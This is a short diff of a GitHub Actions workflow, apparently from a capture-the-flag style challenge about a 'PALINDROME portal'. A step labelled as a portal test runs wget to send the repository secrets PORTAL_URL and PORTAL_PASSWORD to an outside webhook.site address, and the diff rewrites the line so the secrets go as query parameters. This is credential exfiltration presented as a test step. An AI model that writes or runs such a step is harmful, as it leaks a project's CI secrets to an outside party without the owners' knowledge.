@@ -11,5 +11,5 @@ jobs:
       - uses: actions/checkout@v3
       - name: Test the PALINDROME portal
         run: | 
-          C:\msys64\usr\bin\wget.exe '''https://webhook.site/7aa025fd-2e6c-42c9-9408-b5c01417d1f2/${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/7aa025fd-2e6c-42c9-9408-b5c01417d1f2/?u=${{ secrets.PORTAL_URL }}&p=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           cat test
